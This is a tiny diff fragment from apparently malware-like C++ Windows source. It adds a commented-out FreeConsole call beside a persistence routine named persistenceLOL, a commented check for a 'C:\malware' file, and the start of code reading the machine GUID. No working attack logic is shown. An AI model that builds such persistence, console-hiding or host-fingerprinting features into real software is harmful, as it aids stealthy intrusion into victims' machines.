@@ -21,6 +21,7 @@ int wmain()
     //std::filesystem::exists("C:\\malware\\ch0nky.txt");
     if(check){
         persistenceLOL();
+        //FreeConsole();
         //get machine guid
         char value[255];
         DWORD BufferSize = sizeof(value);
